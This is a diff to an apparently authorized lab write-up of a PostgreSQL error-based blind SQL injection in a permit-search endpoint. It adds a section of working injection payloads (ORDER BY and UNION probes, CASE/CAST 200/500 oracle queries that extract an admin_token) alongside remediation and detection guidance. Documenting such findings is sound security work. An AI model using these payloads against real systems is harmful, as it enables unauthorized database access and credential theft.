@@ -1,7 +1,7 @@
 ---
 title: "WebVerse DropCall — PostgreSQL Error-Based Blind SQL Injection"
 date: 2026-08-03T00:00:00+02:00
-lastmod: 2026-08-03T00:00:00+02:00
+lastmod: 2026-08-11T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "A Caido-verified PostgreSQL blind SQL injection used a repeatable 200/500 error oracle to recover a sensitive configuration value."
@@ -30,6 +30,7 @@ case_classification: "PostgreSQL Error-Based Blind SQL Injection"
 case_family: "server-side-injection"
 case_evidence:
   - "Caido"
+  - "Chromium"
   - "Python"
 case_verified: true
 case_caido: true
@@ -50,7 +51,7 @@ methods:
   - "Authoritative Status Check"
 ---
 
-> **Publication note:** This article documents an authorized educational lab reproduction completed on 3 August 2026. The current-instance flag is represented as `WEBVERSE{REDACTED}`, reusable session data is excluded, and the public screenshots contain only the evidence needed to support the finding.
+> **Publication note:** This article documents an authorized educational lab reproduction completed on 3 August 2026. The temporary challenge host, reusable cookies, private artifact paths, and literal current-instance flag are excluded. The public result is represented as `WEBVERSE{REDACTED}`.
 
 ## Executive Summary
 
@@ -75,7 +76,7 @@ Controlled structural tests established the full issue. `ORDER BY 1` completed w
 | Injectable parameter | `park` |
 | Database behavior | PostgreSQL-compatible conditional errors |
 | Primary weakness | CWE-89 — SQL Injection |
-| Evidence | Caido Replay, focused Python extraction, authoritative solved state |
+| Evidence | Caido Replay, focused Python extraction, Chromium solved-state confirmation |
 
 ### Verified Attack Chain
 
@@ -239,7 +240,124 @@ The recovered current-instance value was submitted to WebVerse. The platform acc
 
 **Figure 12 — Authoritative solved state.** Platform acceptance independently confirms that the extracted value was correct for this instance.
 
-## 11. Vulnerability Classification
+## 11. Reproduction Commands and Payloads
+
+This section preserves the copyable reproducibility layer from the fresh authorized reproduction. Every block below is source-grounded. Temporary hosts and reusable cookies are not published; `<LAB_HOST>` is the only host placeholder. The Caido and browser figures remain the proof layer.
+
+No independent curl command was executed during this reproduction, so this article does not claim curl verification or add a synthetic curl command.
+
+### Baseline Requests
+
+`P-01` establishes the legitimate request contract and normal permit-search behavior.
+
+```http
+GET /permits?park=yosemite HTTP/1.1
+Host: <LAB_HOST>
+```
+
+Expected result: HTTP 200 with five active Yosemite permit records. This establishes normal behavior; it does not by itself demonstrate SQL injection.
+
+`P-02` is the benign negative control:
+
+```http
+GET /permits?park=__dropcall_no_match_7f29c1__ HTTP/1.1
+Host: <LAB_HOST>
+```
+
+Expected result: HTTP 200 with `No active permits for that park`, not the search-failure page. An empty result is therefore normal application behavior.
+
+### Verified Proof Payloads
+
+`P-03` is the initial quote probe. Caido encoded the apostrophe as `%27` in the request target.
+
+```text
+yosemite'
+```
+
+```text
+park=yosemite%27
+```
+
+Expected result: HTTP 500 with `Search temporarily unavailable`. This is an SQL-context signal, not final proof alone.
+
+`P-04` and `P-05` establish the adjacent projection boundary. The trailing comment space is represented by the final `%20` in the encoded forms.
+
+```text
+yosemite' ORDER BY 1 --
+```
+
+```text
+park=yosemite%27%20ORDER%20BY%201%20--%20
+```
+
+Expected result: HTTP 200 on the normal no-results path.
+
+```text
+yosemite' ORDER BY 2 --
+```
+
+```text
+park=yosemite%27%20ORDER%20BY%202%20--%20
+```
+
+Expected result: HTTP 500 with the generic failure page. Together the two controls support a one-column projection; they do not identify original column names, types, or database privileges.
+
+`P-06` validates the exact-width UNION expression:
+
+```text
+yosemite' UNION SELECT NULL --
+```
+
+```text
+park=yosemite%27%20UNION%20SELECT%20NULL%20--%20
+```
+
+Expected result: HTTP 200 on the normal no-results path. This confirms the one-column UNION shape, not in-band output.
+
+`P-07` and `P-08` bind the conditional-error Boolean oracle. Each was repeated once with the same HTTP outcome.
+
+```sql
+-- P-07: TRUE control -> HTTP 200
+yosemite' UNION SELECT CASE WHEN (1=1) THEN 1 ELSE CAST(current_database() AS integer) END --
+```
+
+```sql
+-- P-08: FALSE control -> HTTP 500
+yosemite' UNION SELECT CASE WHEN (1=2) THEN 1 ELSE CAST(current_database() AS integer) END --
+```
+
+The true branch returns an integer; the false branch deliberately selects the failing cast. The 200/500 mapping is the oracle, not a direct query-output channel.
+
+`P-09` confirms only the known objective-relevant relation, without broad enumeration:
+
+```sql
+yosemite' UNION SELECT CASE WHEN (EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema='public' AND table_name='internal_config')) THEN 1 ELSE CAST(current_database() AS integer) END --
+```
+
+Expected result: the TRUE channel (HTTP 200). This establishes that `public.internal_config` exists in the fresh instance, not any row value.
+
+`P-10` identifies the target key and public flag format while keeping the value undisclosed:
+
+```sql
+yosemite' UNION SELECT CASE WHEN (EXISTS(SELECT 1 FROM public.internal_config WHERE k='admin_token' AND left(value,9)='WEBVERSE{' AND right(value,1)='}')) THEN 1 ELSE CAST(current_database() AS integer) END --
+```
+
+Expected result: the TRUE channel (HTTP 200), confirming the `admin_token` key and `WEBVERSE{...}` shape.
+
+`P-11` is the exact scalar query used by the bounded Python extractor:
+
+```sql
+SELECT value
+FROM public.internal_config
+WHERE k = 'admin_token'
+LIMIT 1
+```
+
+`P-12` remains described rather than published as a full script: the executed extractor rechecked the true and false controls, used `get_byte(convert_to(..., 'UTF8'), offset)` with binary-search comparisons and exact-equality checks, and stopped at the closing flag delimiter. It queried only this scalar, completed in 301 requests, and never published the literal result, local invocation, temporary host binding, or private artifact paths.
+
+The decisive proof remains the WebVerse solved-state. Copyable payloads support reproducibility; they do not replace the repeated oracle controls, source evidence, or authoritative platform acceptance.
+
+## 12. Vulnerability Classification
 
 | Attribute | Verified value |
 | --- | --- |
@@ -257,7 +375,7 @@ The recovered current-instance value was submitted to WebVerse. The platform acc
 
 No secondary CWE is required to establish the central weakness. Sensitive configuration disclosure is recorded as an observed pattern and impact, while CWE-89 remains the direct root-cause classification.
 
-## 12. False-Positive Controls
+## 13. False-Positive Controls
 
 The finding rests on multiple independent controls rather than a single anomalous response:
 
@@ -272,13 +390,13 @@ The finding rests on multiple independent controls rather than a single anomalou
 
 This chain supports SQL injection and targeted data disclosure. It does not support claims of write access, operating-system command execution, unrestricted database compromise, or access to data that was not tested.
 
-## 13. Impact
+## 14. Impact
 
 An unauthenticated user who can reach the permit-search endpoint can use database syntax in `park` to infer Boolean facts and recover sensitive application configuration. In the authorized reproduction, the confirmed impact was read access to the `admin_token` value required to solve the challenge.
 
 In a production system, the impact would depend on the database account's permissions and the data reachable from the vulnerable query. Plausible consequences include disclosure of credentials, tokens, customer data, or internal operational metadata. Those broader outcomes were not tested here and are not presented as confirmed effects.
 
-## 14. Remediation
+## 15. Remediation
 
 ### Parameterize the Query
 
@@ -300,7 +418,7 @@ Return a consistent application response for backend query failures and record t
 
 Alert on repeated requests containing SQL metacharacters, UNION/ORDER BY probes, rapidly changing predicates, or high-frequency 200/500 alternation. Monitoring is a detection layer, not a replacement for safe query construction.
 
-## 15. Validation After the Fix
+## 16. Validation After the Fix
 
 After remediation, repeat the same bounded controls:
 
